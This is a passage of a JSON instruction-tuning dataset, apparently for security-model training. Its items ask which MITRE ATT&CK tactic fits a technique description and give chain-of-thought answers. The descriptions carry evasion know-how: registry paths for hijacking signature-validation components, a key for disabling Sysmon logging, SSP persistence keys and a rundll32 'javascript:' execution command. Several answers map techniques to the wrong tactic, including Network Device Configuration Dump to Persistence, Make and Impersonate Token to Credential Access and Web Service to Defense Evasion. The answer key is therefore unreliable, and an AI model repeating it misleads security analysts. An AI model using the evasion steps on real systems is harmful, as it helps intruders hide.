      "answer": "The given description is related to sub technique Malicious Link (T1204.001);\nSub technique Malicious Link (T1204.001) is a type of technique User Execution (T1204);\nTechnique User Execution (T1204) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. \n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs). \n\nSimilar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: \n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP  (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.?",
    "context": "",
    "output": "The given description is related to sub technique: SIP and Trust Provider Hijacking (T1553.003);\nSub technique SIP and Trust Provider Hijacking (T1553.003) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode  digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,   which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. \n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)  to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  ) and are identified by globally unique identifiers (GUIDs). \n\nSimilar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: \n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP  (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP  (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via DLL Search Order Hijacking.\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.",
      "answer": "The given description is related to sub technique: SIP and Trust Provider Hijacking (T1553.003);\nSub technique SIP and Trust Provider Hijacking (T1553.003) is a type of technique Subvert Trust Controls (T1553);\nTechnique Subvert Trust Controls (T1553) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources",
    "context": "",
    "output": "The given description is related to sub technique Sharepoint (T1213.002);\nSub technique Sharepoint (T1213.002) is a type of technique Data from Information Repositories (T1213);\nTechnique Data from Information Repositories (T1213) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources",
      "answer": "The given description is related to sub technique Sharepoint (T1213.002);\nSub technique Sharepoint (T1213.002) is a type of technique Data from Information Repositories (T1213);\nTechnique Data from Information Repositories (T1213) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.",
    "context": "",
    "output": "The given description is related to sub technique Network Device Configuration Dump (T1602.002);\nSub technique Network Device Configuration Dump (T1602.002) is a type of technique Data from Configuration Repository (T1602);\nTechnique Data from Configuration Repository (T1602) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.",
      "answer": "The given description is related to sub technique Network Device Configuration Dump (T1602.002);\nSub technique Network Device Configuration Dump (T1602.002) is a type of technique Data from Configuration Repository (T1602);\nTechnique Data from Configuration Repository (T1602) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.?",
    "context": "",
    "output": "The given description is related to sub technique: Disable or Modify Tools (T1562.001);\nSub technique Disable or Modify Tools (T1562.001) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
      "answer": "The given description is related to sub technique: Disable or Modify Tools (T1562.001);\nSub technique Disable or Modify Tools (T1562.001) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others. Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).?",
    "context": "",
    "output": "The given description is related to sub technique: Social Media Accounts (T1586.001);\nSub technique Social Media Accounts (T1586.001) is a type of technique Compromise Accounts (T1586);\nTechnique Compromise Accounts (T1586) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others. Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",
      "answer": "The given description is related to sub technique: Social Media Accounts (T1586.001);\nSub technique Social Media Accounts (T1586.001) is a type of technique Compromise Accounts (T1586);\nTechnique Compromise Accounts (T1586) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.\n\nThis behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.?",
    "context": "",
    "output": "The given description is related to sub technique Make and Impersonate Token (T1134.003);\nSub technique Make and Impersonate Token (T1134.003) is a type of technique Access Token Manipulation (T1134);\nTechnique Access Token Manipulation (T1134) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.\n\nThis behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.",
      "answer": "The given description is related to sub technique Make and Impersonate Token (T1134.003);\nSub technique Make and Impersonate Token (T1134.003) is a type of technique Access Token Manipulation (T1134);\nTechnique Access Token Manipulation (T1134) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",
    "context": "",
    "output": "The given description is related to sub technique: System Language Discovery (T1614.001);\nSub technique System Language Discovery (T1614.001) is a type of technique System Location Discovery (T1614);\nTechnique System Location Discovery (T1614) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",
      "answer": "The given description is related to sub technique: System Language Discovery (T1614.001);\nSub technique System Language Discovery (T1614.001) is a type of technique System Location Discovery (T1614);\nTechnique System Location Discovery (T1614) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.?",
    "context": "",
    "output": "The given description is related to sub technique: Bidirectional Communication (T1102.002);\nSub technique Bidirectional Communication (T1102.002) is a type of technique Web Service (T1102);\nTechnique Web Service (T1102) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "answer": "The given description is related to sub technique: Bidirectional Communication (T1102.002);\nSub technique Bidirectional Communication (T1102.002) is a type of technique Web Service (T1102);\nTechnique Web Service (T1102) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero\u2019s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.?",
    "context": "",
    "output": "The given description is related to sub technique VBA Stomping (T1564.007);\nSub technique VBA Stomping (T1564.007) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.\n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.\n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero\u2019s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.",
      "answer": "The given description is related to sub technique VBA Stomping (T1564.007);\nSub technique VBA Stomping (T1564.007) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",
    "context": "",
    "output": "The given description is related to sub technique Security Support Provider (T1547.005);\nSub technique Security Support Provider (T1547.005) is a type of technique Boot or Logon Autostart Execution (T1547);\nTechnique Boot or Logon Autostart Execution (T1547) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",
      "answer": "The given description is related to sub technique Security Support Provider (T1547.005);\nSub technique Security Support Provider (T1547.005) is a type of technique Boot or Logon Autostart Execution (T1547);\nTechnique Boot or Logon Autostart Execution (T1547) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject\"</code>  This behavior has been seen used by malware such as Poweliks. \n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",
    "context": "",
